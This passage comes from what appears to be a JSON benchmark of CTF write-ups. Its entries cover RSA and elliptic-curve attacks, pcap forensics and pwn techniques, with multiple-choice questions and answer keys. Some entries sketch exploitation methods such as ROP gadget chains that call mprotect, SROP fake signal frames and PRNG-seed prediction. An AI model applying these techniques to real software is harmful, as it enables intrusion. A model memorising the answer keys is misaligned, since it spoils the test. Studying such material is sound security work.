\\(m\\), checking for prime divisors that meet certain conditions, and returning a possible solution \\(n\\)."
        ],
        "question": [
            "In a cryptographic challenge, you're asked to find an integer \\(n\\) such that \\(carmichael\\_lambda(n) = m\\), where \\(m\\) is given. Given the difficulty in computing this directly, you're considering leveraging the property that \\(m\\) could be derived from a semi-prime. Which of the following strategies is based on the idea that \\(m\\) might be the Carmichael function of the product of two primes (\\(m = \\lambda(pq)\\))? - A. Attempt to find a prime number \\(p\\) where \\(2^p - 1 = m\\) - B. Using \\(m\\) directly as \\(n\\) without any modification - C. Enumerate over divisors of \\(m\\) to find prime factors that fit a specific pattern for \\(n\\) - D. Solve for \\(n\\) by directly computing the inverse of the Carmichael function without considering \\(m\\)'s properties ",
            "When solving a cryptographic challenge involving the inverse of a complex function like \\(carmichael\\_lambda(n) = m\\), which of the following tools and techniques is most effective for automating the search for solutions when theoretical analysis alone is insufficient? - A. Manually analyzing each divisor of \\(m\\) without using any computational tools - B. Leveraging a mathematical software tool like SageMath for brute-forcing through divisors, calculating least common multiples (LCM), and checking primality, combined with a scripting library like `pwntools` for server interaction - C. Using a simple calculator to try and compute the inverses manually for each round - D. Relying solely on public internet forums for solutions without engaging in any programming or mathematical computation "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "RoHaLd",
        "write_up": "dataset/raw/RoHaLd.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 180,
        "max_score": 477,
        "difficulty": 0.37735849056603776,
        "knowledge": [
            "Recovering curve parameters for an elliptic curve without direct disclosure of $(c,d,p)$ can be accomplished by algorithmically exploiting known points on the curve. This process involves calculating the Modulus $p$ by deriving and solving equations from these points, enabling the reconstruction of the curve and facilitating further cryptographic operations.\n    - Determine $p$ via $\\gcd$ of expressions derived from the differences and relations of known points on the curve.\n    - Solve for $c^2d$ with the obtained $p$, using the form $c^2 d = \\frac{x_1^2 - x_2^2 + y_1^2 - y_2^2 }{x_1^2 y_1^2 - x_2^2 y_2^2} \\pmod p$.\n    - Recover $c$ and $d$ from $c^2$ and $c^2d$ respectively. This knowledge then allows the re-creation of the curve for further analysis or cryptographic exploitation.",
            "Converting an Edwards curve to Weierstrass form enables the use of built-in Sage functions like discrete logarithm solving which might not be directly applicable or efficient on the original curve. This conversion can be practical when solving discrete log problems on different elliptic curve representations.\n    - Mapping involves changing the curve coordinates and parameters: first from Edwards to Montgomery using specific transformations and then from Montgomery to Weierstrass form. This process requires applying formulas for coordinate transformation and adjusting curve parameters according to the target curve's equation.\n    - Utilize the established mappings and perform coordinate transformations meticulously to ensure the integrity of the conversion, allowing the application of Sage's built-in functions effectively on the transformed curve."
        ],
        "question": [
            "Given four points on an elliptic curve $(u1, v1), (u2, v2), (u3, v3), (u4, v4)$, and the task to recover the modulus $p$ for reconstructing the curve, which calculation correctly contributes to determining $p$? - A. Calculate the square root of each point's $x$-coordinate sum to estimate $p$. - B. Solve for $p$ directly from the sum of all $x$-coordinates and $y$-coordinates. - C. Compute $p \\simeq \\gcd(Y_{1234}, Y_{1324})$ with $Y_{ijkl} = A_{ij} B_{kl} - A_{kl} B_{ij}$, using known formulas for $A_{ij}$ and $B_{ij}$ based on the given points. - D. Use a simple average of $u$ and $v$ coordinates from all given points to estimate $p$. ",
            "When converting an Edwards curve to Weierstrass form for solving the discrete logarithm problem, what step correctly describes part of the conversion process? - A. Multiply the Edwards curve by a scalar to obtain the Weierstrass form directly. - B. Start by converting the Edwards curve to a Circle, then apply a standard transformation to get the Weierstrass form. - C. Map the curve to Montgomery form by setting $u = \\frac{1+y}{1-y}$ and $v = \\frac{2(1+y)}{x(1-y)}$, then proceed to derive Weierstrass coefficients $a$ and $b$. - D. Convert the Edwards curve directly to Weierstrass form by applying a linear transformation on $x$ and $y$ coordinates without adjusting the curve parameters. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "ropme",
        "write_up": "dataset/raw/ropme.md",
        "type": "The type of challenge described in the write-up is a `pwn` challenge.",
        "competition": [
            "BSidesSF/2021",
            "https://ctftime.org/event/1299/tasks/"
        ],
        "score": 579,
        "max_score": 967,
        "difficulty": 0.5987590486039297,
        "knowledge": [
            "When exploiting stack overflow vulnerabilities using Return Oriented Programming (ROP), if direct code injection is not possible due to memory protections such as non-executable stacks, use ROP gadgets to modify memory permissions to executable. This can be achieved by finding gadgets to adjust stack pointers and executing a syscall like `mprotect(2)` to change the stack's permissions, allowing for the execution of a secondary payload (shellcode). This approach necessitates finding gadgets for manipulating registers to hold the syscall number for `mprotect` (typically `eax = 125`), the stack's address as the first argument (`ebx`), the size of the stack to be page-aligned as the second argument (`ecx = 4096`), and the desired permission set as the third argument (`edx = PROT_READ|PROT_WRITE|PROT_EXEC`). The syscall is then triggered using an `int 0x80` gadget. Ensure the stack address is page-aligned before executing `mprotect`.\n   \n   Example gadget sequence for changing stack permissions:\n   ```asm\n   mov ebx, esp ; Grab stack address\n   dec ebx      ; Adjust for page alignment if necessary \n   pop eax      ; Load syscall number for mprotect (125)\n   pop ecx      ; Load page-aligned stack size (4096)\n   pop edx      ; Load desired permissions (PROT_READ|PROT_WRITE|PROT_EXEC)\n   int 0x80     ; System call to change permissions\n   ```",
            "If the target binary's execution environment or memory content is partially or wholly generated from a predictable pseudo-random source (e.g., seeded `rand()`), it is possible to replicate the target environment or memory state locally for analysis or exploitation preparation. This is particularly useful in scenarios where exploiting ROP or similar vulnerabilities requires prior knowledge of memory state, such as addresses of useful gadgets or values. This method requires obtaining or predicting the random seed, which is sometimes provided by the application itself or can be inferred from context (e.g., time of connection if `time()` is used for seeding). Replicating the memory state allows for the preemptive discovery of ROP gadgets or other exploit components in a controlled environment before attempting the actual exploit.\n\n    Example of replicating memory state:\n    ```C\n    srand(time(NULL)); // Seed with the predictable value shared by the target\n    for(int i = 0; i < CODE_LENGTH / 4; i++) {  \n       // Populate an array with values as the target would\n       simulated_random_code[i] = rand();  \n    }\n    ```\n    Utilizing the replicated state, an attacker can analyze the generated random code for exploitable gadgets or sequences to form a part of their exploit."
        ],
        "question": [
            "Which sequence of gadgets and actions should be used to modify the stack's permissions to executable when exploiting a stack overflow vulnerability with Return Oriented Programming (ROP) in a 32-bit system where direct code injection is not possible?  Scenario: You have identified a stack overflow vulnerability in a 32-bit application and need to execute a secondary payload. The stack is non-executable, so you plan to use ROP to change the stack's permissions to executable. You've found gadgets to manipulate register values and can execute `mprotect` syscall by setting `eax` to 125. Your next step involves preparing the right sequence of gadget uses.  - A. `mov eax, esp; dec eax; pop ebx; pop ecx; pop edx; int 0x80` - B. `pop edx; pop ecx; pop ebx; mov eax, 125; int 0x80` - C. `mov ebx, esp; dec ebx; pop eax; pop ecx; pop edx; int 0x80` - D. `pop ebx; pop ecx; pop edx; mov eax, esp; int 0x80` ",
            "In the context of exploiting vulnerabilities that rely on predictable pseudo-random number generation, how can attackers replicate the target environment or memory state for analysis?  Scenario: You are exploiting a vulnerability in an application that uses a pseudo-random number generator (PRNG) seeded with a predictable value. Knowing that the PRNG sequence and consequently the application's memory state can be replicated, you aim to predict the sequence for gadget discovery. The challenge is to identify the correct approach to replicate the PRNG sequence, knowing that the seed is predictable and potentially known.  - A. Use the current system time as the seed in a separate environment and replicate the memory allocation and population process. - B. Analyze the PRNG algorithm without seeding to predict outcomes. - C. Use a hardcoded seed value unrelated to the application's seed. - D. Manually craft memory states based on statistical analysis of the application's behavior. "
        ],
        "answer": [
            "C. `mov ebx, esp; dec ebx; pop eax; pop ecx; pop edx; int 0x80`",
            "A. Use the current system time as the seed in a separate environment and replicate the memory allocation and population process."
        ]
    },
    {
        "name": "ROPuzzle V1",
        "write_up": "dataset/raw/ROPuzzle V1.md",
        "type": "pwn",
        "competition": [
            "DigitalOverdose/2021",
            "https://ctftime.org/event/1459/tasks/"
        ],
        "score": 150,
        "max_score": 600,
        "difficulty": 0.25,
        "knowledge": [
            "For executing a syscall under restricted conditions where direct gadgets are not available, use a combination of ROP gadgets to manipulate the `RAX` register (or any other register as needed) to the required syscall number. This can often involve setting a value in `RAX` using one gadget, moving or modifying this value with other gadgets, and eventually getting to the desired syscall number.\n    - Example: To set `RAX` to 15 (`sigret` syscall number), chain gadgets to first move 6 into `RAX`, then use another gadget to store `RAX` value into `RDI`, set 9 into `RAX` with another gadget, and finally add `RDI` to `RAX`, resulting in `RAX` being 15. This sequence uses `mov`, `add`, and register transfer instructions.",
            "To bypass security mechanisms or restrictions, like a one-time execution due to a variable check, use a writable memory address that you can control as the stack. If that address is known and predictable (e.g., `.data` section), you can perform actions like overwriting a check-variable directly in memory, thereby resetting it as needed, or placing a payload in a position where its address is known and can be referenced in further exploits.\n    - Example: To bypass a one-shot execution check, first perform a `read` syscall directing input to a controlled stack location (e.g., `.data` section at `0x402000`), allowing overwriting of a variable or placing of shellcode/payload in a predictable memory location. Following this setup, execute the desired syscall (e.g., `execve`) with a ROP chain that sets the necessary registers (`RAX`, `RDI`, `RSI`, `RDX`) and points to the controlled stack location containing your payload or command to execute."
        ],
        "question": [
            "In an attempt to execute a syscall using Return-Oriented Programming (ROP) when direct control over certain registers is not available, which sequence of gadgets would correctly set the `RAX` register to 15 for a `sigret` syscall?  - A. Use a gadget to subtract 3 from `RDX`, then move `RDX` to `RAX`. - B. Move 9 into `RAX`, duplicate `RAX` to `RDI`, then use a gadget to add `RDI` to `RAX`. - C. Move 6 into `RAX`, move `RAX` value to `RDI`, then move 9 into `RAX`, and finally add `RDI` to `RAX`. - D. Shift the stack pointer into `RAX` using a gadget, then xor `RAX` to achieve the desired value through bitwise operations. ",
            "To bypass a security mechanism that prevents repeated executions by checking a condition variable set in memory, which approach should be taken when using controlled writable memory?  - A. Execute a format string exploit to overwrite the variable directly in memory. - B. Use a buffer overflow to change the return address to bypass the check. - C. Directly manipulate the instruction pointer to ignore memory-based checks. - D. Perform a `read` syscall to overwrite the check-variable by directing input to a predictable and writable memory address, such as the `.data` section. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "ROR",
        "write_up": "dataset/raw/ROR.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 260,
        "max_score": 755,
        "difficulty": 0.3443708609271523,
        "knowledge": [
            "In cryptographic challenges where encryption involves modular arithmetic (like RSA) and the modulus N is known to be even, any encryption result retains the least significant bit (LSB) of its plaintext. This is due to the mathematical property that the remainder of division by any even number keeps the parity of the original number, meaning if the input is odd, the output remains odd, and likewise for even inputs. Therefore, if one has access to multiple encrypted outputs corresponding to shifted versions of the original plaintext, it's possible to extract the plaintext bits sequentially, particularly when the shifting is rightward and the LSB of each shifted version is leaked through the encryption.",
            "Based on the observation that rightward bit shifts and subsequent encryption of a message can leak the LSB of the message in each step when the modulus N is even, one can recover the entire plaintext message from a series of such encrypted outputs. This process involves collecting the LSB from each encrypted output, reversing the order of these bits (due to the rightward shifts), and then converting the binary string back into bytes to recover the original message. This method assumes that one has a sequence of encrypted values representing subsequent rightward shifts of a single message, making this technique specifically applicable to scenarios where shifting and encryption are used as described, and the modulus used in the encryption is known to be even.\n\nExample Python snippet for LSB recovery and plaintext reconstruction:\n```python\nlines = open(\"chall.txt\", 'r').readlines()\nbits = []\nfor line in lines:\n    v = int(line.strip())\n    bits.append(str(v & 1))\nbits = bits[::-1]  # Reverse the bits to match the original order\nplaintext = int(\"\".join(bits), 2).to_bytes(len(bits) // 8, byteorder='big')\nprint(plaintext)\n```\nThis snippet reads a sequence of encrypted integers from a file, extracts the LSB from each, reverses the bit sequence, and converts the binary string back into the original plaintext bytes."
        ],
        "question": [
            "In a cryptographic system where the modulus \\(N\\) is known to be even, what is the significance of its impact on encrypted outputs based on modular arithmetic? - A. The encrypted outputs will always be prime numbers. - B. It makes the encrypted outputs immune to frequency analysis attacks. - C. Each encrypted output retains the least significant bit (LSB) of its plaintext. - D. The modulus \\(N\\) being even prevents the encryption from being reversed.",
            "Given a series of encrypted outputs corresponding to rightward bit-shifted versions of an original message, with the modulus \\(N\\) used in encryption being even, which Python snippet correctly recovers and reconstructs the original message? - A. ```python lines = open(\"chall.txt\", 'r').readlines() plaintext = ''.join([chr(int(line.strip())) for line in lines]) print(plaintext) ``` - B. ```python lines = open(\"chall.txt\", 'r').readlines() bits = [str(int(line.strip()) % 2) for line in lines] plaintext = int(\"\".join(bits), 2).to_bytes(len(bits) // 8, byteorder='little') print(plaintext) ``` - C. ```python lines = open(\"chall.txt\", 'r').readlines() bits = [] for line in lines: v = int(line.strip()) bits.append(str(v & 1)) bits = bits[::-1]  # Reverse the bits to match the original order plaintext = int(\"\".join(bits), 2).to_bytes(len(bits) // 8, byteorder='big') print(plaintext) ``` - D. ```python lines = open(\"chall.txt\", 'r').readlines() plaintext = ''.join([bin(int(line.strip()))[2:] for line in lines]) print(plaintext) ```"
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Routes Mark The Spot",
        "write_up": "dataset/raw/Routes Mark The Spot.md",
        "type": "The type of challenge in this write-up is **forensics**.",
        "competition": [
            "DanteCTF/2023",
            "https://ctftime.org/event/2000/tasks/"
        ],
        "score": 290,
        "max_score": 500,
        "difficulty": 0.58,
        "knowledge": [
            "When analyzing pcap files for hidden messages in CTF challenges, IPv6 packets might include encoded information within their hexdump patterns. Specifically, characters between specific delimiters (e.g., `:X:` where `X` represents a character) can be extracted to reveal part of a secret message or flag. This method relies on the uniqueness of IPv6 protocol used as a transmission medium for encoded data.",
            "If the extracted characters from such packets are not in the correct order, the IPv6 flow label field can potentially be used to reorder them. Sort the packets based on the ascending order of the binary flow label values. This sorting method implies that each packet's flow label value denotes its sequence in the overall message, enabling the reconstruction of the original message or flag when done correctly."
        ],
        "question": [
            "When analyzing pcap files for hidden messages, which protocol's hexdump pattern might be carefully examined for encoded information between specific delimiters like `:X:`, where `X` represents a character that could reveal part of a secret message or flag? - A. TCP - B. HTTP - C. IPv6 - D. UDP",
            "In the context of pcap analysis for CTF challenges, how can the order of packets carrying parts of a hidden message be determined if the message pieces are initially found to be out of sequence? - A. Sort packets by the timestamp at which they were sent. - B. Use the packet length in descending order. - C. Sort packets based on the ascending order of their binary flow label values. - D. Arrange packets in the order of descending IP address values."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "rrop",
        "write_up": "dataset/raw/rrop.md",
        "type": "pwn",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 479,
        "max_score": 499,
        "difficulty": 0.9599198396793587,
        "knowledge": [
            "In a challenge involving Return-Oriented Programming (ROP) with a buffer overflow vulnerability, Sigreturn-Oriented Programming (SROP) can be utilized to bypass restrictions and execute arbitrary code when system calls are needed but direct control over arguments in conventional ROP chains is difficult. This approach requires finding gadgets to set the `rax` register to the syscall number for `sigreturn` (which is 15 on x86_64 architectures) and to execute a syscall. A fake signal frame can then be constructed on the stack to control the flow of execution, including setting the necessary registers for subsequent syscalls (e.g., for `mprotect` to make memory executable). This technique is especially useful when direct execution of shellcode is not initially possible due to memory permissions.\n    - Example payload components: \n        - `mov_rax_15_ret` gadget to set `rax` to 15.\n        - `syscall_ret` gadget to trigger a syscall.\n        - A `SigreturnFrame` instance to construct the fake signal frame with desired register values.",
            "When preparing to exploit a buffer overflow to perform SROP, careful calculation of stack addresses and payload size is necessary to ensure the fake signal frame and any additional payloads (e.g., shellcode) are correctly positioned. This implies the necessity of leaking a stack address to accurately place the shellcode and the fake signal frame in the buffer. Additionally, an `mprotect` syscall can be invoked via SROP to change the memory permissions of the stack (or other regions) to executable (RWX), which enables the execution of shellcode placed in the stack. This technique requires aligning the address passed to `mprotect` to a page boundary (typically, by zeroing out the least significant 12 bits of the leaked stack address).\n    - Direct application: Use the leaked buffer address to align the target memory region for `mprotect`, set the permissions to RWX, and specify the correct return address to jump to the shellcode.\n        - Leaked address manipulation: `leak&~(0xfff)` to align the address.\n        - Setting `frame.rdi`, `frame.rsi`, and `frame.rdx` for `mprotect` syscall arguments within the fake signal frame."
        ],
        "question": [
            "In the context of exploiting a buffer overflow vulnerability using Sigreturn-Oriented Programming (SROP) in an x86_64 architecture, which of the following gadgets is crucial for setting up a fake signal frame to execute a syscall directly? - A. A gadget to move the value `10` into the `rbp` register. - B. A gadget to set the `rax` register to `15`, corresponding to the syscall number for `sigreturn`. - C. A gadget to increment the `rsp` register by `1`. - D. A gadget that directly calls the `execve` syscall.",
            "When exploiting a buffer overflow to execute a shellcode using Sigreturn-Oriented Programming (SROP) and an `mprotect` syscall, which of the following steps correctly aligns the memory address for `mprotect` to modify permissions to executable (RWX)? - A. Using the bitwise OR operator to align the leaked address with the page boundary. - B. Incrementing the leaked address until it is divisible by the page size. - C. Zeroing the 12 least significant bits of the leaked address to align it to a page boundary. - D. Multiplying the leaked address by the size of a memory page."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "RSA - 1",
        "write_up": "dataset/raw/RSA - 1.md",
        "type": "crypto",
        "competition": [
            "DeconstruCT.F/2021",
            "https://ctftime.org/event/1453/tasks/"
        ],
        "score": 150,
        "max_score": 597,
        "difficulty": 0.25125628140703515,
        "knowledge": [
            "When dealing with RSA encryption challenges where the ciphertext (c), public key exponent (e), and modulus (n) are given, tools like RsaCtfTool can be utilized to perform various attacks and potentially decrypt the information without manually breaking down the RSA components. This approach is particularly useful when direct factorization of the modulus or direct decryption seems impractical due to the size of the numbers involved.",
            "The success of decryption using tools like RsaCtfTool often depends on the tool's ability to exploit weaknesses in the RSA setup, such as using known vulnerabilities like small prime numbers, common modulus attacks, or even trying known primes from past CTF challenges (pastctfprimes attack). This highlights the importance of ensuring secure RSA key generation practices, avoiding small or widely used prime numbers for the key components."
        ],
        "question": [
            "In RSA encryption challenges where you are given the ciphertext (c), public key exponent (e), and modulus (n), which tool can be efficiently used to attempt various decryption attacks including factorization of the modulus or exploiting common vulnerabilities?  - A. OpenSSL - B. Wireshark - C. RsaCtfTool - D. Ghidra ",
            "What does the use of tools like RsaCtfTool exploit to successfully decrypt messages in RSA encryption challenges, indicating a need for secure RSA key generation practices?  - A. High-performance computing power - B. Vulnerabilities such as small prime numbers or known primes from past challenges - C. Advanced mathematical algorithms unique to the tool - D. The ability to intercept and analyze network traffic in real-time "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "RSA - 2",
        "write_up": "dataset/raw/RSA - 2.md",
        "type": "crypto",
        "competition": [
            "DeconstruCT.F/2021",
            "https://ctftime.org/event/1453/tasks/"
        ],
        "score": 150,
        "max_score": 597,
        "difficulty": 0.25125628140703515,
        "knowledge": [
            "In RSA encryption challenges, when the public exponent \\(e\\) is significantly smaller than the modulus \\(n\\) and if \\(c = m^e \\mod n\\) is such that \\(m^e < n\\), the ciphertext \\(c\\) essentially equals \\(m^e\\) without reduction by \\(n\\). In these cases, the plaintext message \\(m\\) can be recovered by taking the \\(e\\)th root of the ciphertext \\(c\\). This method exploits the low exponent vulnerability in RSA encryption.  \nExample Python snippet to compute \\(m\\):  \n```python\nfrom decimal import Decimal, getcontext\ngetcontext().prec = 1024 # precision should be sufficiently high\nc = Decimal(ciphertext)  # ciphertext\ne = Decimal(exponent)    # public exponent, e.g., 3\nroot = pow(c, 1/e)       # Calculate the e-th root of c\nm_int = int(root)        # Convert to integer\n```",
            "Conversion of a large integer to its ASCII representation often requires transformation from integer to hexadecimal, and then decoding the hexadecimal string to ASCII. This step is essential for extracting human-readable text from decrypted RSA messages, which usually represent the plaintext message \\(m\\) in integer form.  \nExample Python snippet for conversion from integer \\(m\\) to ASCII:  \n```python\nm_hex = hex(m_int)[2:-1] # Remove '0x' at the start and 'L' at the end if present\nm_ascii = ''.join(chr(int(m_hex[i:i+2], 16)) for i in range(0, len(m_hex), 2)) # Hex to ASCII\nprint(m_ascii)\n```"
        ],
        "question": [
            "In the context of RSA encryption, when given a small public exponent, e.g., `e = 3`, and a ciphertext `c` that does not need reduction by the modulus `n` due to `m^e < n`, which of the following Python code snippets correctly demonstrates how to compute the plaintext message `m` by exploiting the low exponent vulnerability? - A. ```python from decimal import Decimal e = Decimal(3) c = Decimal(ciphertext) m = pow(c, float(1/e)) ``` - B. ```python from decimal import Decimal, getcontext getcontext().prec = 1024 c = Decimal(ciphertext) e = Decimal(3) root = pow(c, 1/e) m_int = int(root) ``` - C. ```python e = 3 c = ciphertext m = c ** (1/e) ``` - D. ```python from decimal import Decimal c = Decimal(ciphertext) e = Decimal(3) m = c^e ```",
            "When it is required to decrypt an RSA message and convert the large integer result back into its ASCII representation, which Python snippet correctly performs the conversion from a decrypted integer `m_int` into a readable ASCII string? - A. ```python m_ascii = str(m_int) ``` - B. ```python m_ascii = ''.join([chr(i) for i in str(m_int)]) ``` - C. ```python m_hex = hex(m_int)[2:] m_ascii = ''.join(chr(int(m_hex[i:i+2], 16)) for i in range(0, len(m_hex), 2)) ``` - D. ```python m_hex = hex(m_int)[2:-1] m_ascii = ''.join(chr(int(m_hex[i:i+2], 16)) for i in range(0, len(m_hex), 2)) ```"
        ],
        "answer": [
            "B.",
            "D."
        ]
    },
    {
        "name": "RSA - 3",
        "write_up": "dataset/raw/RSA - 3.md",
        "type": "crypto",
        "competition": [
            "DeconstruCT.F/2021",
            "https://ctftime.org/event/1453/tasks/"
        ],
        "score": 250,
        "max_score": 597,
        "difficulty": 0.4187604690117253,
        "knowledge": [
            "In RSA encryption challenges, when given the public key parameters (n and e), if the exponent e is large and the public key n is a product of two large primes that are close together, Weiner's Attack might be applicable to find the private exponent d. This attack is efficient when d is small relative to the modulus n.",
            "Tools like https://www.dcode.fr/rsa-cipher or other RSA decryption tools can be used to easily calculate the private key exponent d by providing the public modulus n and the public exponent e. This method is particularly useful when manual calculation is infeasible due to the large size of n or e.\n\nKnowledge Example:\n\n- Given: Large public exponent (e) and modulus (n) as part of an RSA public key.\n- Application: Use Weiner's Attack through online tools for decrypting or finding the private exponent (d) in RSA encryption challenges.\n\n(Note: It is not feasible to generate a specific payload example for using Weiner's Attack as it involves complex mathematical computation that is typically executed by algorithms within cryptographic tools.)"
        ],
        "question": [
            "In the context of RSA encryption, when a public key is provided with substantial values for the modulus (n) and the public exponent (e), under which scenario would Weiner's Attack be a viable method to determine the private exponent (d)? - A. When both n and e are small prime numbers. - B. When d is significantly larger than n. - C. When e is small and n is a product of two large distinct primes. - D. When d is small relative to the modulus n and e is large.",
            "To find the private exponent (d) in RSA when provided with a large public exponent (e) and the modulus (n), which approach is recommended for practicality and efficiency? - A. Manually calculating the prime factors of n. - B. Utilizing RSA decryption tools like https://www.dcode.fr/rsa-cipher by inputting n and e. - C. Guessing d through a trial and error method until the correct value is found. - D. Using Euclid's algorithm to find the greatest common divisor (GCD) of n and e."
        ],
        "answer": [
            "D.",
            "B."
        ]
    },
    {
        "name": "RSA Frustration",
        "write_up": "dataset/raw/RSA Frustration.md",
        "type": "crypto",
        "competition": [
            "WolvCTF/2022",
            "https://ctftime.org/event/1612/tasks/"
        ],
        "score": 499,
        "max_score": 500,
        "difficulty": 0.998,
        "knowledge": [
            "When dealing with RSA encryption challenges where the encryption process is repeated multiple times with different primes that have specific properties (e.g., primes such that (p-1) is divisible by e^2), a strategic approach involves factoring the modulus N for each encryption instance. Using online tools like FactorDB to find prime factors of large numbers can significantly speed up this process. Once the primes are gathered, utilize the Chinese Remainder Theorem (CRT) alongside nth root extraction for decryption, iterating through possible roots to find the decryption that leads to a valid flag format.",
            "To enhance efficiency in decrypting RSA with multiple layers of encryption, consider employing a Depth First Search (DFS) algorithm that recurses through potential decryptions based on the depth of encryption. This method can be optimized by narrowing down the candidates for each decryption step based on the bit length of the ciphertext. Smaller sets of candidates can be selected for decryption trials by using criteria such as the minimal size of candidate decryptions for ciphertexts of varying bit lengths, thus reducing the computational load and time required to recover the original message."
        ],
        "question": [
            "In an RSA encryption challenge where primes p and q are chosen with the property that (p-1) is divisible by e^2, and an online database like FactorDB is used to factorize the modulus N for decryption purposes. What critical step should be taken once the prime factors are obtained to decrypt the message?  - A. Apply the Chinese Remainder Theorem (CRT) and nth root extraction iteratively to find the decrypted message that matches a known flag format. - B. Submit the prime factors to an online RSA decryption service to find the flag directly without further computations. - C. Use the prime factors to generate a new pair of public and private keys, then use these keys to decrypt the encrypted message normally. - D. Encrypt the prime factors with the given public key to verify their accuracy before attempting decryption. ",
            "When optimizing a decryption process for an RSA challenge involving multiple layers of encryption, how can the efficiency of a Depth First Search (DFS) algorithm be increased by adjusting the selection of decryption candidates?  - A. By utilizing the bit length of the ciphertext to limit the number of candidate decryptions, thus selecting a smaller set of possibilities for each decryption based on the size criteria. - B. By increasing the number of decryption candidates as the bit length of the ciphertext increases to ensure all possible decryptions are explored. - C. By selecting only the largest decryption candidates for all ciphertexts regardless of bit length, to minimize the number of recursions needed. - D. By randomly selecting decryption candidates to ensure a broad and diversified search space is explored, enhancing the chance of finding the correct decryption. "
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "RSA Gone Wrong",
        "write_up": "dataset/raw/RSA Gone Wrong.md",
        "type": "crypto",
        "competition": [
            "RITSEC/2022",
            "https://ctftime.org/event/1558/tasks/"
        ],
        "score": 391,
        "max_score": 500,
        "difficulty": 0.782,
        "knowledge": [
            "When given `phi` in an RSA encryption challenge and needing to find `n`, use the totient to systematically search for prime candidates for `p` and `q`. This involves generating the set of prime factors of `phi`, iterating over possible combinations of these factors, and testing each combination to see if it leads to valid prime numbers for `p` and `q` by adding 1 to the product of a combination and checking if the result is prime. This method works under the condition that the prime factors of `phi` are available or can be determined.",
            "Decrypting an RSA-encrypted message without directly knowing `n` but having its totient `phi`, the exponent `e`, and the ciphertext `ct` is possible by finding `p` and `q` through the method described above, calculating `d` as the modular multiplicative inverse of `e` modulo `phi`, and then decrypting the ciphertext with \\(d\\) and \\(n = p \\cdot q\\). This decryption step is applicable when `p` and `q` have been identified as primes and their product forms a valid `n` for the RSA encryption."
        ],
        "question": [
            "In an RSA encryption challenge, you are given the totient `phi` and need to find `n` but do not have the prime factors of `n` directly. You have identified the prime factors of `phi` as an integral step in finding prime candidates for `p` and `q`. What is the next logical step in this scenario? - A. Calculate the sum of the prime factors of `phi` and check if it is prime. - B. Iterate over all possible combinations of these prime factors, compute the product of each combination plus 1, and check if it results in prime numbers for `p` and possibly for `q`. - C. Directly calculate `n` by squaring `phi`. - D. Use the prime factors of `phi` to perform a linear search for `n` without further processing. ",
            "When you have the ciphertext `ct`, the exponent `e`, and the totient `phi` of an RSA encryption but not `n`, and you discover prime candidates for `p` and `q` that allow for the calculation of a valid `n`, what is the next critical step to decrypt the message? - A. Calculate the sum of `p` and `q` and use it as a key to decrypt `ct`. - B. Use `p` and `q` directly as decryption keys without any further calculations. - C. Compute `d` as the modular multiplicative inverse of `e` modulo `phi` and then use `d` along with \\(n = p \\cdot q\\) to decrypt `ct`. - D. Multiply `ct` by `e` and attempt direct decryption without calculating `d`. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "RSA Interna Attacker",
        "write_up": "dataset/raw/RSA Interna Attacker.md",
        "type": "crypto",
        "competition": [
            "THCon/2021",
            "https://ctftime.org/event/1381/tasks/"
        ],
        "score": 206,
        "max_score": 500,
        "difficulty": 0.412,
        "knowledge": [
            "In an RSA challenge where two parties share the same modulus (n), but have different public exponents (e), an internal attacker with access to one party's private key (d) can decrypt messages intended for the other party. This is possible because the underlying primes (p, q) determining the modulus (n) are the same, and knowing one private key, the modulus, and the public key allows for the determination of the other private key.",
            "To derive the primes (p, q) from known public modulus (n), public exponent (e), and private exponent (d), one can use an algorithm based on the property that `kphi = d*e - 1` is a multiple of `phi(n)`. By finding an integer `a` such that `gcd(x - 1, n)` gives a non-trivial factor of `n` (where `x = pow(a, k, n)` for some `k`), one can factor `n` to find `p` and `q`. This method relies on the fact that for correctly chosen `a` and `k`, `x` will be a non-trivial square root of 1 modulo `n`, leading to the discovery of `p` and `q`.\n\nSample of derived factors extraction code:\n```python\nfrom math import gcd\n\nn = int(input(\"Enter the value of n: \"))\ne = int(input(\"Enter the value of e: \"))\nd = int(input(\"Enter the value of d: \"))\n\nkphi = d * e - 1\nt = kphi\n\nwhile t % 2 == 0:\n    t = divmod(t, 2)[0]\n\na = 2\nwhile a < 100:\n    k = t\n    while k < kphi:\n        x = pow(a, k, n)\n        if x != 1 and x != (n - 1) and pow(x, 2, n) == 1:\n            p = gcd(x - 1, n)\n            break\n        k = k * 2\n    a = a + 2\n\nq = n // p\nassert (p * q) == n\nprint('p = ', p)\nprint('q = ', q)\nprint('phi is ', (p - 1) * (q - 1))\n```"
        ],
        "question": [
            "In a scenario where an internal attacker has intercepted an RSA encrypted message intended for another party, and they both share the same modulus but have different public exponents, which of the following is true about decrypting the message?  - A. The attacker cannot decrypt the message without brute-forcing the encryption. - B. The attacker needs to intercept the private key of the intended recipient to decrypt the message. - C. The attacker can decrypt the message by deriving the other party's private key, given they know one private key and both public exponents. - D. The attacker must request the decryption key from the message sender to decrypt it. ",
            "When deriving the primes (p, q) from a known public modulus (n), public exponent (e), and private exponent (d) in an RSA system using the provided algorithm, which statement accurately describes the necessary condition for selecting `a` and `k` that leads to the discovery of `p` and `q`?  - A. `a` must be a prime number bigger than `n` for the algorithm to work. - B. `k` must be selected such that its multiplication with `a` always equals `n`. - C. `a` is chosen in a way that for some `k`, `x = pow(a, k, n)` results in `x` being a non-trivial square root of 1 modulo `n`, which leads to finding `p` and `q`. - D. `d` must be inversely proportional to `e` for `a` and `k` to be determined successfully. "
        ],
        "answer": [
            "C. The attacker can decrypt the message by deriving the other party's private key, given they know one private key and both public exponents.",
